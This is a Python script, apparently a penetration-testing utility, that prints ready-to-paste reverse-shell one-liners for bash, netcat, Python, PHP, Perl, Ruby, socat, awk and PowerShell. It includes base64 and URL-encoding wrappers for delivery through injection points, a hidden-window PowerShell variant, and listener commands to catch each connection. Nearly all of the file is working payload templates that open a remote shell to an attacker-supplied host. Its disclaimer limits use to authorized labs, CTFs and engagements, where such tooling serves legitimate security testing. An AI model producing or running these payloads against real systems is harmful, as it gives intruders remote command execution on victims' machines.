#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
revshell.py - Generate reverse-shell one-liners and the matching listener.

Prints ready-to-paste reverse shells for a chosen LHOST/LPORT across many
interpreters (bash, nc, python, php, perl, ruby, powershell, socat, awk...),
with optional URL-encoding or base64 wrapping for delivery, plus the listener
command to catch the connection. It only builds strings - it never connects.

For use on systems you are authorized to test (labs, CTFs, engagements with
written permission). Authorized / educational use only.

Examples:
    python3 revshell.py 10.10.14.9 4444
    python3 revshell.py 10.10.14.9 4444 -t bash --base64 --listener nc
    python3 revshell.py 10.10.14.9 4444 -t powershell --url-encode
    python3 revshell.py 10.10.14.9 4444 --platform windows
    python3 revshell.py --list
"""

import argparse
import base64
import sys
import urllib.parse

# name -> (platform, payload template with {ip}/{port}).
SHELLS = {
    "bash":       ("linux", "bash -i >& /dev/tcp/{ip}/{port} 0>&1"),
    "bash-196":   ("linux", "0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196"),
    "sh":         ("linux", "sh -i >& /dev/tcp/{ip}/{port} 0>&1"),
    "nc-e":       ("linux", "nc {ip} {port} -e /bin/sh"),
    "nc-mkfifo":  ("linux", "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"),
    "python3":    ("linux", "python3 -c 'import socket,os,pty;s=socket.socket();"
                            "s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f) for f in(0,1,2)];"
                            "pty.spawn(\"/bin/bash\")'"),
    "php":        ("linux", "php -r '$s=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
    "perl":       ("linux", "perl -e 'use Socket;$i=\"{ip}\";$p={port};"
                            "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                            "if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
                            "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"),
    "ruby":       ("linux", "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;"
                            "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"),
    "socat":      ("linux", "socat TCP:{ip}:{port} EXEC:/bin/sh"),
    "socat-tty":  ("linux", "socat TCP:{ip}:{port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane"),
    "awk":        ("linux", "awk 'BEGIN{{s=\"/inet/tcp/0/{ip}/{port}\";while(1){{do{{printf \"shell>\" |& s;"
                            "s |& getline c;if(c){{while((c |& getline) > 0)print $0 |& s;close(c)}}}}"
                            "while(c!=\"exit\")close(s)}}}}' /dev/null"),
    "powershell": ("windows", "powershell -nop -w hidden -c \"$c=New-Object System.Net.Sockets.TCPClient("
                              "'{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
                              "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
                              "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
                              "$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';"
                              "$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);"
                              "$s.Flush()}};$c.Close()\""),
    "nc-windows": ("windows", "nc.exe {ip} {port} -e cmd.exe"),
}

LISTENERS = {
    "nc":        "nc -lvnp {port}",
    "ncat":      "ncat -lvnp {port}",
    "socat":     "socat -d -d TCP-LISTEN:{port},reuseaddr FILE:`tty`,raw,echo=0",
    "socat-tty": "socat file:`tty`,raw,echo=0 TCP-LISTEN:{port},reuseaddr",
    "pwncat":    "pwncat-cs -lp {port}",
}


def build(name, ip, port):
    return SHELLS[name][1].format(ip=ip, port=port)


def wrap_base64(payload, platform):
    """Deliver the payload base64-encoded so quoting survives copy/paste."""
    if platform == "windows":
        enc = base64.b64encode(payload.encode("utf-16-le")).decode()
        return f"powershell -nop -w hidden -enc {enc}"
    enc = base64.b64encode(payload.encode()).decode()
    return f"echo {enc}|base64 -d|bash"


def main():
    p = argparse.ArgumentParser(
        description="Generate reverse-shell one-liners and the matching listener.",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("ip", nargs="?", help="LHOST - your listener IP")
    p.add_argument("port", nargs="?", help="LPORT - your listener port")
    p.add_argument("-t", "--type", help="one interpreter by name (blank = all)")
    p.add_argument("--platform", choices=("linux", "windows"),
                   help="only show payloads for this platform")
    p.add_argument("--base64", action="store_true",
                   help="wrap each payload base64-encoded for clean delivery")
    p.add_argument("--url-encode", action="store_true",
                   help="percent-encode each payload for a web injection point")
    p.add_argument("--listener", choices=tuple(LISTENERS),
                   help="also print the command to catch the shell")
    p.add_argument("--list", action="store_true",
                   help="list the interpreter names and exit")
    args = p.parse_args()

    if args.list:
        for name, (plat, _) in SHELLS.items():
            print(f"  {name:<12} {plat}")
        return

    if not args.ip or not args.port:
        p.error("ip and port are required (or use --list)")
    if args.type and args.type not in SHELLS:
        p.error(f"unknown type '{args.type}'. See --list.")

    names = [args.type] if args.type else list(SHELLS)
    if args.platform:
        names = [n for n in names if SHELLS[n][0] == args.platform]
    if not names:
        p.error("no payload matches that --type / --platform combination.")

    print(f"[*] Reverse shells for {args.ip}:{args.port}\n")
    for name in names:
        plat, _ = SHELLS[name]
        payload = build(name, args.ip, args.port)
        if args.base64:
            payload = wrap_base64(payload, plat)
        if args.url_encode:
            payload = urllib.parse.quote(payload)
        print(f"[{plat}] {name}")
        print(f"  {payload}\n")

    if args.listener:
        print("[*] Listener")
        print(f"  {LISTENERS[args.listener].format(port=args.port)}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)
